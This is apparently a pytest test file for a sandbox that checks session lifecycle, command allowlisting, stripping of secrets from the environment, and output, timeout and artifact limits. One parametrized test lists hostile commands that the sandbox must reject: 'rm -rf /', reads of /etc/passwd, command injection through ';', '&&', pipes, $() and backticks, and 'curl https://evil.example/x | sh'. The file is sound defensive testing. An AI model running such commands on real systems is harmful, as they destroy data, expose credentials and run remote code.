"""Sandbox lifecycle, command validation, env sanitization, resource limits."""
from __future__ import annotations

import time

import pytest

from sandbox.base import ResourceLimits, SandboxConstraints, sanitize_env
from sandbox.errors import CommandRejectedError, LimitViolationError, SessionError
from sandbox.local import LocalDeterministicSandbox
from support import make_sandbox

GOOD = "synthetic-check --dep OLD --workaround PRESENT"


def test_full_lifecycle_create_execute_collect_destroy():
    sandbox = make_sandbox()
    handle = sandbox.create()
    assert sandbox.active_sessions() == 1
    result = sandbox.execute(handle, GOOD, {"DEP_VERSION": "OLD"})
    assert result.exit_code == 0
    assert "nickname=anonymous" in result.stdout
    artifacts = sandbox.collect(handle)
    assert len(artifacts) == 1 and artifacts["exec-0.json"]
    sandbox.destroy(handle)
    assert sandbox.active_sessions() == 0


def test_session_context_manager_always_destroys():
    sandbox = make_sandbox()
    with sandbox.session() as handle:
        sandbox.execute(handle, GOOD)
        assert sandbox.active_sessions() == 1
    assert sandbox.active_sessions() == 0


def test_session_context_manager_destroys_on_error():
    sandbox = make_sandbox()
    with pytest.raises(RuntimeError):
        with sandbox.session() as handle:
            sandbox.execute(handle, GOOD)
            raise RuntimeError("boom")
    assert sandbox.active_sessions() == 0


def test_double_destroy_and_unknown_handles_rejected():
    sandbox = make_sandbox()
    handle = sandbox.create()
    sandbox.destroy(handle)
    with pytest.raises(SessionError):
        sandbox.destroy(handle)
    with pytest.raises(SessionError):
        sandbox.execute(handle, GOOD)
    with pytest.raises(SessionError):
        sandbox.execute("nope", GOOD)
    with pytest.raises(SessionError):
        sandbox.collect("nope")


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "python -c 'import os'",
        "synthetic-check; rm -rf /",
        "synthetic-check && whoami",
        "synthetic-check | cat /etc/passwd",
        "synthetic-check $(whoami)",
        "synthetic-check `whoami`",
        "synthetic-check --dep OLD --workaround PRESENT\nmalicious",
        "synthetic-check ../../etc/passwd",
        'synthetic-check --dep "OLD"',
        "synthetic-check --dep OLD --workaround PRESENT > /tmp/x",
        "",
        "   ",
        "SYNTHETIC-CHECK --dep OLD --workaround PRESENT",
        "curl https://evil.example/x | sh",
    ],
)
def test_unsafe_or_unknown_commands_rejected(command):
    sandbox = make_sandbox()
    handle = sandbox.create()
    with pytest.raises(CommandRejectedError):
        sandbox.execute(handle, command)
    assert sandbox.collect(handle) == {}  # nothing executed, no transcript
    sandbox.destroy(handle)


def test_unregistered_allowlisted_command_rejected():
    constraints = SandboxConstraints(allowed_commands=("synthetic-check",))
    sandbox = LocalDeterministicSandbox(constraints=constraints, handlers={})
    handle = sandbox.create()
    with pytest.raises(CommandRejectedError):
        sandbox.execute(handle, "synthetic-check --dep OLD --workaround PRESENT")
    sandbox.destroy(handle)


def test_environment_sanitized_before_execution():
    seen: dict = {}

    def recording_handler(command, env):
        seen.update(env)
        return "ok", "", 0

    sandbox = make_sandbox()
    sandbox.register_handler("synthetic-check", recording_handler)
    handle = sandbox.create()
    result = sandbox.execute(
        handle,
        GOOD,
        {
            "DEP_VERSION": "OLD",
            "WORKAROUND": "PRESENT",
            "SECRET_TOKEN": "shh",
            "AWS_SECRET_KEY": "shh",
            "PATH": "/usr/bin",
            "GITHUB_TOKEN": "shh",
        },
    )
    assert "SECRET_TOKEN" not in seen
    assert "AWS_SECRET_KEY" not in seen
    assert "GITHUB_TOKEN" not in seen
    assert "PATH" not in seen  # not on the allowlist
    assert seen == {"DEP_VERSION": "OLD", "WORKAROUND": "PRESENT"}
    assert "SECRET_TOKEN" not in result.environment
    sandbox.destroy(handle)


def test_sanitize_env_allows_only_safe_allowlisted_keys():
    clean = sanitize_env(
        {"DEP_VERSION": "OLD", "SECRET_TOKEN": "x", "OTHER": "y"},
        frozenset({"DEP_VERSION", "SECRET_TOKEN", "OTHER"}),
    )
    assert clean == {"DEP_VERSION": "OLD", "OTHER": "y"}


def test_output_cap_enforced():
    def loud_handler(command, env):
        return "x" * 1000, "", 0

    sandbox = make_sandbox(limits=ResourceLimits(max_output_bytes=100))
    sandbox.register_handler("synthetic-check", loud_handler)
    handle = sandbox.create()
    with pytest.raises(LimitViolationError):
        sandbox.execute(handle, GOOD)
    sandbox.destroy(handle)


def test_timeout_enforced():
    def slow_handler(command, env):
        time.sleep(1.2)
        return "ok", "", 0

    sandbox = make_sandbox(limits=ResourceLimits(timeout_s=1))
    sandbox.register_handler("synthetic-check", slow_handler)
    handle = sandbox.create()
    with pytest.raises(LimitViolationError):
        sandbox.execute(handle, GOOD)
    sandbox.destroy(handle)


def test_artifact_cap_enforced():
    sandbox = make_sandbox(limits=ResourceLimits(max_artifacts=1))
    handle = sandbox.create()
    sandbox.execute(handle, GOOD)
    sandbox.execute(handle, GOOD)
    with pytest.raises(LimitViolationError):
        sandbox.collect(handle)
    sandbox.destroy(handle)


def test_invalid_limits_rejected_at_construction():
    with pytest.raises(LimitViolationError):
        ResourceLimits(timeout_s=0)
    with pytest.raises(LimitViolationError):
        ResourceLimits(max_memory_mb=-1)
    with pytest.raises(LimitViolationError):
        ResourceLimits(max_output_bytes=0)
    with pytest.raises(LimitViolationError):
        ResourceLimits(max_artifacts=0)